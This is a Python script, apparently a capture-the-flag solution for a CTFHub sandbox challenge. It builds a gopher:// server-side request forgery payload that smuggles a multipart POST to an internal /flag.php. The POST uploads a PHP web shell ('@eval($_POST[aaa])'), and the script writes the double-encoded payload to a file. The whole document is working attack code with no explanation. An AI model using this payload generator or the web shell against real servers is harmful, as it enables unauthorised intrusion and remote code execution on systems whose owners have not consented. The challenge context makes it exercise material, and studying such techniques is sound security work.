from urllib import parse

http_head=\
"""POST /flag.php HTTP/1.1
Host: challenge-1f549266db403f05.sandbox.ctfhub.com:10800
Content-Length: 313
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge-1f549266db403f05.sandbox.ctfhub.com:10800
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPz0oqBZZBttEcChM
Referer: http://challenge-1f549266db403f05.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

------WebKitFormBoundaryPz0oqBZZBttEcChM
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: application/x-php

<?php @eval($_POST[aaa]);?>

------WebKitFormBoundaryPz0oqBZZBttEcChM
Content-Disposition: form-data; name="submit"

提交
------WebKitFormBoundaryPz0oqBZZBttEcChM--
   
"""
value =parse.quote(http_head,safe="")#safe参数表示不进行编码的参数
new=value.replace('%0A','%0D%0A')

result = '_'+new
result="gopher://127.0.0.1:80/"+result

result=result.replace('%','%25')#编码%

print(result)
book = open("payload.txt","w+",encoding="utf-8")
book.write(result)
book.close()